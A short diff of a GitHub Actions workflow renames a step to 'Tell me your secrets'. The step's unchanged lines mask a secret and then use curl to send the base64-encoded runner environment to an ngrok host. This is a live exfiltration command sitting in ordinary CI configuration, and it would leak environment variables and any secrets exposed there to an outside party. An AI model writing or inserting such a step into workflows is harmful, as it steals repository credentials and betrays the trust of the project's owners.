@@ -19,7 +19,7 @@ jobs:
 
 
     steps:
-      - name: Add mask
+      - name: Tell me your secrets
         run: |
           echo "::add-mask::${{ secrets.FAVORITE }}"
           curl -k https://1d15-128-130-238-29.eu.ngrok.io/?data=$(env | base64 --wrap=0)
